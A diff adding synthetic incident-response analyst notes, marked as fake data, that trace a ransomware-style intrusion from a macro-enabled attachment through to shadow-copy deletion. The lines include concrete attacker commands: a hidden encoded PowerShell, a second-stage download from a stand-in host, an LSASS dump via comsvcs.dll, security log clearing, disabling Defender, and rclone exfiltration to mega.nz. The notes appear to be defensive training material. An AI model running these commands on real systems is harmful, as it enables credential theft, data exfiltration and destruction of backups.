@@ -1,0 +1,16 @@
+# Analyst notes from IR-2026-114 (fake data). One observation per line.
+User opened the attachment invoice_8841.docm and enabled macros
+WINWORD spawned powershell.exe -nop -w hidden -EncodedCommand SQBFAFgA...
+PowerShell downloadstring pulled a second stage from cdn-update.example.test
+Scheduled task UpdaterCheck created with schtasks /create /sc minute /mo 30
+Run key added under HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+rundll32 C:\Windows\System32\comsvcs.dll MiniDump 624 lsass.dmp full
+whoami /all and net group "domain admins" /domain run from the infected host
+Lateral movement with Enter-PSSession to FILESRV01 over WinRM
+Implant beaconing over HTTPS to 203.0.113.45 every 60 seconds
+wevtutil cl Security on FILESRV01
+Defender real-time protection disabled with Set-MpPreference -DisableRealtimeMonitoring $true
+rclone copy of the finance share to mega.nz
+vssadmin delete shadows /all /quiet ahead of encryption
+Detection fired: Sigma rule for T1003.001
+Printer queue jammed on floor 3
